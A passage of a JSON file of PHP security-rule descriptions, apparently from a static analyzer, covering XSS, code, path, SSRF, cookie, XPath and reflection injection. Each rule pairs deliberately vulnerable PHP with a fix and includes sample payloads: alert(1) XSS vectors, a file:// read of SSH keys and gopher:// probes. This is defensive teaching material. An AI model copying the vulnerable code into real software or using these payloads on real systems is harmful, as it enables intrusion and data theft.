<td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  { data }\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  &lt;script&gt;\n    alert(1)\n  &lt;/script&gt;\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; → &amp;amp; </li>\n          <li> &lt; → &amp;lt; </li>\n          <li> &gt; → &amp;gt; </li>\n          <li> \" → &amp;quot; </li>\n          <li> ' → &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an attribute surrounded with single or double quotes</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"{ data }\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"\"\n     onmouseover=\"alert(1)\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; → &amp;amp; </li>\n          <li> &lt; → &amp;lt; </li>\n          <li> &gt; → &amp;gt; </li>\n          <li> \" → &amp;quot; </li>\n          <li> ' → &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an unquoted attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag={ data }&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=foo\n     onmouseover=alert(1)&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a URL attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"{ data }\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>\n      as a scheme.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a script block</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  { data }\n&lt;/script&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>\n&lt;!doctype html&gt;\n&lt;script data=\"{ data }\"&gt;\n  ...\n&lt;/script&gt;\n</pre></td>\n    </tr>\n  </tbody>\n</table>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>Single quoted variables in attributes</h4>\n<p>By default, <code>htmlspecialchars</code> does not encode single quotes, so if <code>$input</code> is untrusted, JavaScript code can be\ninjected.</p>\n<p>Make sure to set the option <code>ENT_QUOTES</code> to encode single quotes.</p>\n<h5>Noncompliant code example</h5>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\necho \"&lt;img src='\" . htmlspecialchars($input) . \"'&gt;\";\n</pre>\n<h5>Compliant solution</h5>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\necho \"&lt;img src='\" . htmlspecialchars($input, ENT_QUOTES) . \"'&gt;\";\n</pre>\n<h4>Headers and output</h4>\n<p>If the HTTP body is sent before <code>header</code> is called, no headers will be sent to the client.</p>\n<p>To fix this issue, send the headers before any output.</p>\n<h5>Noncompliant code example</h5>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\necho 'No more headers at this point';\nheader('Content-Type: text/plain');\necho $input;\n</pre>\n<h5>Compliant solution</h5>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nheader('Content-Type: text/plain');\necho $input;\n</pre>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/wordpress-stored-xss-vulnerability\">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/ghost-admin-takeover\">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n  <li> <a href=\"https://samy.pl/myspace/\">Samy Kamkar, The MySpace Worm</a> </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> <a href=\"https://www.youtube.com/watch?v=ksq7e6UUDag\">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S5334": {
        "name": "Dynamic code execution should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the\nbehavior of the targeted application and modify it to get access to sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable\napplication.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code\nruns with root privileges, and therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of code injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it builds and dynamically runs PHP code based on untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$operation = $_GET['operation'];\neval(\"product_${operation}();\"); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$allowed = [\"add\", \"remove\", \"update\"];\n$operation = $allowed[$_GET[\"operationId\"]];\nif ($operation !== \"\") {\n    eval(\"product_${operation}();\");\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<p>The compliant code example uses such a binding approach.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/moodle-remote-code-execution/\">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S2083": {
        "name": "I/O function calls should not be vulnerable to path injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting\npath would resolve somewhere in the filesystem where the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override or delete arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited\nto remove or corrupt files that are critical for the application or for the system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h4>Read arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to\nleak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>\n<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$fileName = $_GET[\"filename\"];\n\nfile_get_contents($fileName); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$fileName = $_GET[\"filename\"];\n$targetDirectory = \"/path/to/target/directory/\";\n\n$path = realpath($targetDirectory . $fileName);\n\nif (str_starts_with($path,  $targetDirectory)) {\n    file_get_contents($path);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths\nconstructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>\n  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>\n  <li> Resolve the canonical path of the file by using methods like <code>`realPath`</code>. This will resolve relative path or path components like\n  <code>../</code> and removes any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S5144": {
        "name": "Server-side requests should not be vulnerable to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>\n<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be\ntreated in the same way as basic SSRF.</p>\n<h3>What is the potential impact?</h3>\n<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to\nwhat is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>\n<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can\nrange from low to critical severity.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Local file read to host takeover</h4>\n<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File\nURI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web\napplication.</p>\n<h4>Internal Network Reconnaissance</h4>\n<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port\nfield in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for\nexample, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$host = $_GET['host'];\n$url = \"https://$host/.well-known/openid-configuration\";\n\n$ch = curl_init($url); // Noncompliant\ncurl_exec($ch);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$allowedHosts = [\"trusted1\" =&gt; \"trusted1.example.com\", \"trusted2\" =&gt; \"trusted2.example.com\"];\n$host = $allowedHosts[$_GET['host']];\n$url = \"https://$host/.well-known/openid-configuration\";\n\n$ch = curl_init($url);\ncurl_exec($ch);\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.commit.malicious.io</code>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "phpsecurity:S6287": {
        "name": "Applications should not create session cookies from untrusted input",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>\n<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the\napplication.</p>\n<p>The injection might occur via a GET parameter, and the payload, for example, <code><a\nhref=\"https://example.com?cookie=injectedcookie\">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a\nsession that isn’t theirs.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Sensitive data disclosure</h4>\n<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of\nimplications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>\n<h4>Vulnerability chaining</h4>\n<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and\nexploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,\nwhich can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfunction checkCookie()\n{\n    if (!isset($_COOKIE['PHPSESSID'])) {\n        $value = $_GET['cookie'];\n        setcookie('PHPSESSID', $value); // Noncompliant\n    }\n\n    header('Location: /welcome.php');\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfunction checkCookie()\n{\n    if (!isset($_COOKIE['PHPSESSID'])) {\n        header('Location: /getcookie.php');\n    }\n\n    header('Location: /welcome.php');\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the\nvalue of a session cookie to untrusted data.</p>\n<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade\ntools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to\nuse these solutions than to develop your own.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "phpsecurity:S6350": {
        "name": "Constructing arguments of system commands from user input is security-sensitive",
        "htmlDesc": "<p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920\">CVE-2016-9920</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472\">CVE-2021-29472</a> </li>\n</ul>\n<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the\nprograms. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing\nfiles into specific directories.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Malicious arguments can result in undesired behavior in the executed command. </li>\n  <li> Passing user input to a system command is not necessary. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid constructing system commands from user input when possible. </li>\n  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>\n  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in\nvulnerabilities:</p>\n<pre>\n$input = $_GET['input'];\nsystem('/usr/bin/find ' . escapeshellarg($input)); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use an allow-list to restrict the arguments to trusted values:</p>\n<pre>\n$input = $_GET['input'];\nif (in_array($input, $allowed, true)) {\n  system('/usr/bin/find ' . escapeshellarg($input));\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/php-supply-chain-attack-on-composer\">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>\n</ul>",
        "severity": "MAJOR"
      },
      "phpsecurity:S2091": {
        "name": "XPath expressions should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without\nsanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to execute malicious commands in the affected XML documents.</p>\n<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML\nstructures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to\nharmless.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data Leaks</h4>\n<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility\nstill exists with configuration files, for example.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked\norganization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the\nregular operations of an organization.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to XPath injection because untrusted data is concatenated to an XPath query without prior\nvalidation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfunction authenticate(DOMXpath $xpath, string $username, string $password): bool {\n    $expression = \"/users/user[@name='\" . $username . \"' and @pass='\" . $password . \"']\";\n    $entries = $xpath-&gt;evaluate($expression);\n\n    return $entries.length &gt; 0\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfunction authenticate(DOMXpath $xpath, string $username, string $password): bool {\n    if (!preg_match(\"/^[a-zA-Z0-9]*$/\", $username) || !preg_match(\"/^[a-zA-Z0-9]*$/\", $password)) {\n        return false;\n    }\n\n    $expression = \"/users/user[@name='\" . $username . \"' and @pass='\" . $password . \"']\";\n    $entries = $xpath-&gt;evaluate($expression);\n\n    return $entries-&gt;length &gt; 0\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<h4>Validation</h4>\n<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it\nin an XPath query.</p>\n<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>\n<p>Input can be validated in multiple ways:</p>\n<ul>\n  <li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li>\n  <li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric\n  characters.) </li>\n  <li> By ensuring user input does not include any XPath metacharacters, such as <code>\"</code>, <code>'</code>, <code>/</code>, <code>@</code>,\n  <code>=</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li>\n</ul>\n<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>\n<p>In the compliant solution, a regex match ensures the username and password only contain alphanumeric characters before executing the XPath\nquery.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection\">OWASP, XPath Injection\n  Prevention Cheat Sheet</a> </li>\n  <li> <a href=\"https://web.archive.org/web/20230602194100/https://www.ambionics.io/blog/hacking-watchguard-firewalls\">Ambionics, XPath Injection\n  Section of \"Hacking WatchGuard Firewalls'</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/643\">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S6173": {
        "name": "Reflection should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to\ninspect, load or invoke a component by name.</p>\n<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code\nexecution on the server’s website.</p>\n<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the\ninitial reflection logic to an impactful malicious one.</p>\n<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected\ncode to run. The attacker can use this ability to run arbitrary code on the server.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>\n<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted\nactions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the 